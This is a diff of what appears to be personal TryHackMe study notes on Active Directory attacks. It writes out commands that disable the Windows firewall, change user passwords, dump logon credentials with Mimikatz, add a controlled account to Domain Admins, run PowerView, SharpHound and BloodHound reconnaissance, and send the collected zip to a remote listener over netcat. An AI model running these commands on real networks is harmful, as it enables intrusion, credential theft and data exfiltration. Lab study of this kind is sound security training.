@@ -28,12 +28,11 @@
       
   >net accounts    /login policy
   >Write-Output "${env:COMPUTERNAME}"  //get computername
-  //if the display of shell is not recgnized,
-    chcp 65001  //change to utf encode
+      //if the display of shell is not recgnized,
+        chcp 65001  //change to utf encode
 
-    netstat -nao //check the services running on Win
-  
-    net user $username $passwd  //change the passwd of a user
+        netstat -nao //check the services running on Win
+        net user $username $passwd  //change the passwd of a user
   #### turn off firewall
     $netsh advirewall set allprofiles state off
   #### check firewall status
@@ -53,9 +52,9 @@
 
 
     
-### emulate info of domain
+#### emulate info of domain
   powershell.exe -nop -exec bypass  #fireup the powershell
-    #Powerview to emulate the domain infor;
+    //Powerview to emulate the domain infor;
   Import-Module .\PowerView.ps1
   Get-NetDOmain
   >Get-NetUser | select cn
@@ -67,49 +66,44 @@
       
     Get-NetLoggedon -ComputerName $cumputername # get remote access from other user. & not guarantee to use
 ####  PowerUp1.ps1
-  get Administrator access.
+    get Administrator access.
     the result will be :  C:\Windows\Panther\Unattend\Unattended.xml.
-####passwd hash format of win
-  hashcat -m 13100
-### mimikaz :to get the hash of remote access admin
-  privilege::debug    #run this first, to test the privi of mimikaz
+#### passwd hash format of win
+      hashcat -m 13100
+#### mimikaz :to get the hash of remote access admin
+      privilege::debug    #run this first, to test the privi of mimikaz
+      sekurlsa::logonPasswords  #to view the passwd or passwd hash of user login this host
 
-  sekurlsa::logonPasswords  #to view the passwd or passwd hash of user login this host
+#### check services running on this host or domain by spn
+      Get-NetUser -SPN select serviceprincipalname, samaccountname
+      net user sqladmin /domain
 
-###  check services running on this host or domain by spn
-  Get-NetUser -SPN select serviceprincipalname, samaccountname
-
-  net user sqladmin /domain
-
-### check the privi of account to Domain admins grp "ActiveDirectoryRIghts" like gernericAll
-  Get-objectAcl -Identify "Domain admins"   /only get the SID of the account
-
-  Convert-SidToName $UID  /to convert
-
-  / if we find a SID is diff from other,, try to compromise this ID
-  / net group "Domain Admins" $username(which you controlled)  /add /domain
-    / net group "Domain Admins" $username(which you controlled)  /del /domain
+#### check the privi of account to Domain admins grp "ActiveDirectoryRIghts" like gernericAll
+      Get-objectAcl -Identify "Domain admins"   /only get the SID of the account
+      Convert-SidToName $UID  /to convert
+      / if we find a SID is diff from other,, try to compromise this ID
+      / net group "Domain Admins" $username(which you controlled)  /add /domain
+        / net group "Domain Admins" $username(which you controlled)  /del /domain
   
-### sharphound    /sharphound to collect info, send to host, bloodhound to view the result
-  Sharphound.exe --Domain za.tryhackme.com --ExcludeDCs
-  
-  / /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1
-  Import-Module .\SharpHound
+#### sharphound    /sharphound to collect info, send to host, bloodhound to view the result
+      Sharphound.exe --Domain za.tryhackme.com --ExcludeDCs
+      / /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1
+      Import-Module .\SharpHound
+    
+      Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\ -OutputPrefix "$name"  /a file.zip will be created. 
+    
+      Invoke-RestMethod -Uri $serveruri  -Method Post -InFile #dir -UserDefaultCredentials
+    
+      nc -nvlp $port > name.zip
 
-  Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\ -OutputPrefix "$name"  /a file.zip will be created. 
-
-  Invoke-RestMethod -Uri $serveruri  -Method Post -InFile #dir -UserDefaultCredentials
-
-  nc -nvlp $port > name.zip
-
-  ####neo4j   for bloodhound
-    $sudo neo4j start
-
-    $bloodhound
-      upload the .zip==> analysis ==> shortest paths
-          match (m:Computer) return m , or m:User
-          then mark a cimputeror user as owned. click shortest path from owned priciplals
-          right click the connection to view the suggestions.
+#### neo4j   for bloodhound
+        $sudo neo4j start
+    
+        $bloodhound
+          upload the .zip==> analysis ==> shortest paths
+              match (m:Computer) return m , or m:User
+              then mark a cimputeror user as owned. click shortest path from owned priciplals
+              right click the connection to view the suggestions.
 
   ### passwd spray
     /netexec   #pwned means right.    # -u listofname.txt
